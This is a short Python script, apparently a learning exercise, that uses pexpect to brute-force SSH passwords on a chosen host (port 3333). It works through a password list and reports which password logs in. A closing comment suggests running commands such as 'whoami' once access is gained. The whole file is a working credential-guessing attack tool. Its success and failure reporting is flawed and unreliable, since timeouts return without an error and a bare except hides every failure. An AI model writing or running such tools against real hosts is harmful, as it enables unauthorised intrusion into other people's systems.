#!/usr/bin/python3

import pexpect
from termcolor import colored

prompt = ['# ', '$ ', '>>> ', '>> ']

def connect(host, user, password):
    ssh_prompt = "Are you sure you"         # Expected
    conn = "ssh " + user + "@" + host + ' -p 3333'
    child = pexpect.spawn(conn)
    ret = child.expect([pexpect.TIMEOUT, ssh_prompt, '[P|p]assword: '])

    if ret == 0:
        print("[-] Error Connecting...!")
        return
    if ret == 1:
        child.sendline("yes")
        ret = child.expect([pexpect.TIMEOUT, '[P|p]assword: ', ssh_prompt])
        if ret == 0:
            print("[-] Error Connecting...!")
            return

    child.sendline(password)
    child.expect(prompt, timeout=1)

    return child

def main():
    host = input(colored(("Enter the host IP: "), 'blue'))
    user = input(colored(("Enter the username: "), 'blue'))
    file = open("pass.txt", "r")

    for password in file.readlines():
        password = password.strip('\n')
        try:
            child = connect(host, user, password)
            print(colored(("[+] Password Found. Login Successful: " + password), 'green'))
        except:
            print(colored(("[-] Wrong Password: " + password), 'red'))

main()


"""
The send_command functionality could be pasted here in this script.

def send_commands(connection, command):
    connection.sendline(command)
    connection.expect(prompt)
    print(connection.before, end='\n')

@Line 39, add "send_commands(child, 'whoami')"
"""